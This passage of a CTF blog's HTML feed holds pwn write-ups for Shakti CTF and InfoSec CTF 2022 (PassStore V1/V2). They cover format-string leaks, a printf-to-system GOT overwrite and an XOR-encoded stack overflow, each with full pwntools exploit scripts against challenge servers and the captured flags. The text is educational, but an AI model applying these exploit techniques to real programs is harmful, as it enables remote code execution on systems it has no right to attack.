kingdoms!&quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      menu();</span><br><span class="line">      v3 = getchar();</span><br><span class="line">      getchar();</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="string">&#x27;3&#x27;</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      white_walkers(&amp;num_men, &amp;num_dragons);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v3 &gt; <span class="string">&#x27;3&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">LABEL_10:</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Invalid choice!&quot;</span>);</span><br><span class="line">      exit_function(<span class="number">0LL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( v3 == <span class="string">&#x27;1&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      num_dragons = use_dragons();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="string">&#x27;2&#x27;</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_10;</span><br><span class="line">      kings_landing(&amp;num_men, &amp;num_dragons);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>The main function has a 3 functions to keep an eye on.</p><ol><li>num_dragons &#x3D; use_dragons();</li><li>kings_landing(&amp;num_men, &amp;num_dragons);</li><li>white_walkers(&amp;num_men, &amp;num_dragons);</li></ol><p>Letâ€™s take a look at each one.</p><h4 id="1-use-dragons"><a href="#1-use-dragons" class="headerlink" title="1. use_dragons()"></a>1. <code>use_dragons()</code></h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">use_dragons</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> format[<span class="number">24</span>]; <span class="comment">// [rsp+10h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n\nYou currently have %d number of dragons.\n&quot;</span>, <span class="number">3LL</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\nSay something in Valyrian: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%10s&quot;</span>, format);</span><br><span class="line">  getchar();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;The dragons say: &quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(format);                               <span class="comment">// fsb</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">3LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>In this function, format variable receives 10 characters from player and outputs them as they are. Since <code>printf()</code> doesnâ€™t specify a format string when printing, the <strong>Format String Bug(FSB)</strong> possibility exists.</p><p>The return value 3 is stored in <code>num_dragons</code> that global variable.</p><h4 id="2-kings-landing-amp-num-men-amp-num-dragons"><a href="#2-kings-landing-amp-num-men-amp-num-dragons" class="headerlink" title="2. kings_landing(&amp;num_men, &amp;num_dragons)"></a>2. <code>kings_landing(&amp;num_men, &amp;num_dragons)</code></h4><p>In this funciton, the main parts of the functon are as follows.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( choice == <span class="string">&#x27;2&#x27;</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *num_dragons &amp;&amp; *num_dragons &lt;= <span class="number">3u</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;How many dragons would you like to use ?\n&gt; &quot;</span>);</span><br><span class="line">      __isoc99_scanf(<span class="string">&quot;%u&quot;</span>, &amp;use_dragons);</span><br><span class="line">      <span class="keyword">if</span> ( use_dragons &amp;&amp; use_dragons &lt;= <span class="number">3</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        *num_dragons -= use_dragons;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%u dragon(s) have been used!\nAre you going to kill the white walkers ?\n&gt; &quot;</span>, use_dragons);</span><br><span class="line">        getchar();</span><br><span class="line">        __isoc99_scanf(<span class="string">&quot;%50[^\n]s&quot;</span>, format);</span><br><span class="line">        <span class="built_in">printf</span>(format);                         <span class="comment">// fsb</span></span><br><span class="line">      &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;You only use dragons that you have&quot;</span>);</span><br><span class="line">        exit_function(<span class="number">0LL</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>We can use the 3 dragons. It means we have the <strong>3 chances with FSB</strong> in this function. However, the <code>use_dragons()</code> must precede this function.</p><h4 id="3-white-walkers-amp-num-men-amp-num-dragons"><a href="#3-white-walkers-amp-num-men-amp-num-dragons" class="headerlink" title="3. white_walkers(&amp;num_men, &amp;num_dragons)"></a>3. <code>white_walkers(&amp;num_men, &amp;num_dragons)</code></h4><p>There is no meaningful code to find vulnerablilties.</p><h2 id="Vulnerability"><a href="#Vulnerability" class="headerlink" title="Vulnerability"></a>Vulnerability</h2><p>In <code>use_dragons()</code> function, There is 1 FSB.<br>In <code>kings_landing()</code> function, There are 3 chances with FSB.</p><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>The exploit progressed relatively quickly in the local environment, but took a long time in the remote envireonment. I guess itâ€™s because of libc version.</p><p>(It may be my mistake that I downloaded the wrong libc from CTF web site..)</p><p>Even though libc was given, this version doesnâ€™t seem to match from remote environment, so I guessed the offset. Except for the offset, the exploit is same as in the local environment. <strong>So the offest is dirty because it was obtained by guessing.</strong></p><h3 id="Exploit-Scenario"><a href="#Exploit-Scenario" class="headerlink" title="Exploit Scenario"></a>Exploit Scenario</h3><p>We have to leak the base address of the binary and libc using <strong>FSB that in <code>use_dragons()</code></strong>. After getting the bases, we know the address of â€˜printf()â€™ in binary and <code>system()</code> in libc. So we can overwriting <code>system()</code> to <code>printf@got</code>. In this case, it uses <strong>the FSB triggered by the <code>kings_landing()</code></strong>. </p><p>I use the <code>fmtstr_payload</code> in pwntools for comfortable. The FSB payload has a 50 length limit, so I use the <code>write_size</code> argument and only 4 bytes of the <code>system()</code> for overwriting.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = fmtstr_payload(<span class="number">10</span>, &#123;e.got[<span class="string">&#x27;printf&#x27;</span>] : p64(system)[:<span class="number">4</span>] &#125;, write_size = <span class="string">&#x27;short&#x27;</span>)</span><br></pre></td></tr></table></figure><p>After overwriting, When the <code>printf()</code> is executed, the <code>system()</code> will be executed. We need to focus on the <code>printf()</code> that has only one argument. That argument is our input. It means that we have to find <code>pirntf(input);</code> same as <code>system(input);</code>. </p><p>It is not implemented in the exploit code, but after interactive we can execute the <code>use_dragons()</code> and sent the <code>sh</code> string to the part that receives the input values.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">use_dragons</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> format[<span class="number">24</span>]; <span class="comment">// [rsp+10h] [rbp-20h] BYREF</span></span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%10s&quot;</span>, format);</span><br><span class="line">  <span class="built_in">printf</span>(format); <span class="comment">// system(format);</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">3LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>You may be wondering if itâ€™s okay to pass invalid arguments to the <code>system()</code>. For example as below.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// printf(&quot;\n\nYou currently have %d number of dragons.\n&quot;, 3LL);</span></span><br><span class="line">system(<span class="string">&quot;\n\nYou currently have %d number of dragons.\n&quot;</span>, <span class="number">3LL</span>);</span><br></pre></td></tr></table></figure><p>It just prints an error saying it canâ€™t run but the binary isnâ€™t exit.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sh: line 1: ff: command not found</span><br></pre></td></tr></table></figure><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">e = ELF(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment"># libc = e.libc</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;65.2.136.80&#x27;</span>, <span class="number">32261</span>)</span><br><span class="line">    <span class="comment"># p = process(&#x27;./chall&#x27;)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">use_dragons</span>(<span class="params">fmt</span>):</span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;choice:&#x27;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;an:&#x27;</span>, fmt)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">kings_landing</span>(<span class="params">use, fmt</span>):</span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;choice:&#x27;</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;ns\n\n&#x27;</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, <span class="built_in">str</span>(use))</span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, fmt)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">white_walkers</span>():</span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;choice:&#x27;</span>, <span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># leak</span></span><br><span class="line">    use_dragons(<span class="string">&#x27;%17$p%39$p&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">    leak = <span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line">    libc.address = leak-<span class="number">0x80</span>-<span class="number">0x23800</span>-<span class="number">0x800</span>-<span class="number">3</span></span><br><span class="line">    <span class="comment"># libc.address = leak - 0x851f0</span></span><br><span class="line">    info(<span class="built_in">hex</span>(libc.address))</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">    e.address = <span class="built_in">int</span>(p.recv(<span class="number">12</span>), <span class="number">16</span>) - <span class="number">0x1140</span></span><br><span class="line">    info(<span class="built_in">hex</span>(e.address))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># printf got -&gt; system</span></span><br><span class="line">    system = libc.address + <span class="number">0x55410</span>+<span class="number">0x100</span>-<span class="number">0x3180</span>-<span class="number">0x100</span></span><br><span class="line">    payload = fmtstr_payload(<span class="number">10</span>, &#123;e.got[<span class="string">&#x27;printf&#x27;</span>] : p64(system)[:<span class="number">4</span>] &#125;, write_size = <span class="string">&#x27;short&#x27;</span>)</span><br><span class="line">    <span class="comment"># if len(payload) &gt; 50:</span></span><br><span class="line">        <span class="comment"># p.close()</span></span><br><span class="line">        <span class="comment"># continue</span></span><br><span class="line">    <span class="comment"># print(len(payload))</span></span><br><span class="line">    kings_landing(<span class="number">1</span> ,payload)</span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment"># cmd</span></span><br><span class="line"><span class="comment"># In sue_dragons() function,</span></span><br><span class="line"><span class="comment"># system(&#x27;sh&#x27;);</span></span><br></pre></td></tr></table></figure><p>I used loop bescause of offset prediction and FSB payload length.</p><h3 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shaktictf&#123;F0rm4T_S7r1ng5_4nd_G0T_0v3Rwr17e_4r3_7h3_r34l_k1ll3rs_4d9ddd93416dd1881ae5a725a2cb0058&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> Shakti </category>
          
      </categories>
      
      
        <tags>
            
            <tag> fsb </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>InfoSec CTF 2022 - Secure PassStoreV2</title>
      <link href="/221207-infosecctf2022-secure_passstorev2/"/>
      <url>/221207-infosecctf2022-secure_passstorev2/</url>
      
        <content type="html"><![CDATA[<h2 id="Info"><a href="#Info" class="headerlink" title="Info"></a>Info</h2><p>(8&#x2F;219) solves</p><h3 id="description"><a href="#description" class="headerlink" title="description"></a>description</h3><p>New! More secure! Latest version of Secure PassStoreV2! Url: 0.cloud.chals.io:15467</p><h3 id="for-player"><a href="#for-player" class="headerlink" title="for player"></a>for player</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">â””â”€â”€ passStoreV2</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">passStoreV2: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=1ff9162a72b5d184e7101eae1706a6eb6b57e374, for GNU/Linux 3.2.0, not stripped</span><br></pre></td></tr></table></figure><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><h3 id="Mitigation"><a href="#Mitigation" class="headerlink" title="Mitigation"></a>Mitigation</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><h3 id="Source-Code"><a href="#Source-Code" class="headerlink" title="Source Code"></a>Source Code</h3><p>ë°”ë¡œ ì „ ë¬¸ì œì¸ version 1ê³¼ì˜ ì°¨ì´ëŠ” í•˜ë‚˜ë‹¤. ë°”ë¡œ keyë¥¼ ì¶œë ¥ì„ ì•ˆí•´ì¤€ë‹¤ëŠ” ê²ƒ.</p><h2 id="Vulnerability"><a href="#Vulnerability" class="headerlink" title="Vulnerability"></a>Vulnerability</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">changeName</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Your name is &quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(username);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please type your name: &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, username, <span class="number">0x20</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Your new name: &quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(username);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>printfëŠ” null ë°”ì´íŠ¸ë¥¼ ë§Œë‚˜ê¸° ì „ê¹Œì§€ ì¶œë ¥í•œë‹¤. ì´ë¥¼ ì´ìš©í•´ì„œ username ë°”ë¡œ ë’¤ì— ì¡´ìž¬í•˜ëŠ” key ê°’ì„ leakí•  ìˆ˜ ìžˆë‹¤.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.bss:00000000004040A0 username        db 20h dup(?)           ; DATA XREF: addName(void)+18â†‘o</span><br><span class="line">.bss:00000000004040A0                                         ; changeName(void)+18â†‘o ...</span><br><span class="line">.bss:00000000004040C0                 public key</span><br><span class="line">.bss:00000000004040C0 key             db    ? ;               ; DATA XREF: readPass(void)+6Câ†‘o</span><br><span class="line">.bss:00000000004040C0                                         ; addPass(void)+70â†‘o ...</span><br></pre></td></tr></table></figure><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><h3 id="Exploit-Scenario"><a href="#Exploit-Scenario" class="headerlink" title="Exploit Scenario"></a>Exploit Scenario</h3><ol><li>nameì„ 0x20 ë°”ì´íŠ¸ ê½‰ ì±„ì›Œ ë³´ë‚´ê³  key ê°’ leak</li><li>payload ìž‘ì„± í›„ addPass í•¨ìˆ˜ì˜ ë¡œì§ êµ¬í˜„</li></ol><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line">e = ELF(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./chall&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;0.cloud.chals.io&#x27;</span>, <span class="number">15467</span>)</span><br><span class="line"></span><br><span class="line">name = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">name += <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x1f</span></span><br><span class="line">name += <span class="string">b&#x27;B&#x27;</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;name: \r\n&#x27;</span>, name)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;it\r\n&#x27;</span>, <span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;B&#x27;</span>)</span><br><span class="line">key = p.recvuntil(<span class="string">&#x27;P&#x27;</span>)[:-<span class="number">1</span>]</span><br><span class="line">info(key)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;name: \r\n&#x27;</span>, name)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;it\r\n&#x27;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">buf = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">buf += <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x30</span>+<span class="number">0x8</span>)</span><br><span class="line">buf += p64(<span class="number">0x40160B</span>) <span class="comment"># 0x40160a</span></span><br><span class="line">buf += <span class="string">b&#x27;\n&#x27;</span></span><br><span class="line"></span><br><span class="line">src = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">255</span>):</span><br><span class="line">    <span class="keyword">if</span> buf[i] == <span class="number">10</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    src.append(key[i%<span class="number">8</span>] ^ buf[i])</span><br><span class="line"></span><br><span class="line">src = <span class="built_in">bytes</span>(src)</span><br><span class="line">pause()</span><br><span class="line">p.sendline(src)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;Pas5St0r3_15_n07_600d_50lu710n_;(&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> Sunshine </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>InfoSec CTF 2022 - Secure PassStoreV1</title>
      <link href="/221207-infosecctf2022-secure_passstorev1/"/>
      <url>/221207-infosecctf2022-secure_passstorev1/</url>
      
        <content type="html"><![CDATA[<h2 id="Info"><a href="#Info" class="headerlink" title="Info"></a>Info</h2><p>(8&#x2F;219) solves</p><h3 id="description"><a href="#description" class="headerlink" title="description"></a>description</h3><p>Try to use new superpuper secure command line password storage!</p><p>url: 0.cloud.chals.io:12367</p><h3 id="for-player"><a href="#for-player" class="headerlink" title="for player"></a>for player</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">â””â”€â”€ passStoreV1</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">passStoreV1: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=2349feff7fdc9215b7e1275413f61af630980a82, for GNU/Linux 3.2.0, not stripped</span><br></pre></td></tr></table></figure><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><h3 id="Mitigation"><a href="#Mitigation" class="headerlink" title="Mitigation"></a>Mitigation</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>ë¬¸ì œ í’€ë‹¤ê°€ ë°”ì´ë„ˆë¦¬ê°€ ë°”ë€Œì—ˆë‹¤. &#x3D;ã……&#x3D; ì›ëž˜ íŒŒì´ê°€ ìžˆì—ˆëŠ”ë° íŒŒì´ê°€ ì‚¬ë¼ì¡Œë‹¤. </p><h3 id="Source-Code"><a href="#Source-Code" class="headerlink" title="Source Code"></a>Source Code</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  welcome();</span><br><span class="line">  addName();</span><br><span class="line">  keyGen();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    menu();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>mainì€ ì´ë ‡ê²Œ ìƒê²¼ë‹¤. welcome í•¨ìˆ˜ëŠ” ë³¼ ê²Œ ì—†ì–´ì„œ ê·¸ ë‹¤ìŒ í•¨ìˆ˜ë¶€í„° ë³´ìž.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">addName</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please type your name: &quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, username, <span class="number">0x20</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ì „ì—­ ë³€ìˆ˜ usernameì— 0x20 ë§Œí¼ ì“¸ ìˆ˜ ìžˆë‹¤.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">keyGen</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> seed; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  seed = time(<span class="number">0LL</span>);</span><br><span class="line">  srand(seed);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Some preparations....&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">7</span>; ++i )</span><br><span class="line">    key[i] = rand() % <span class="number">26</span> + <span 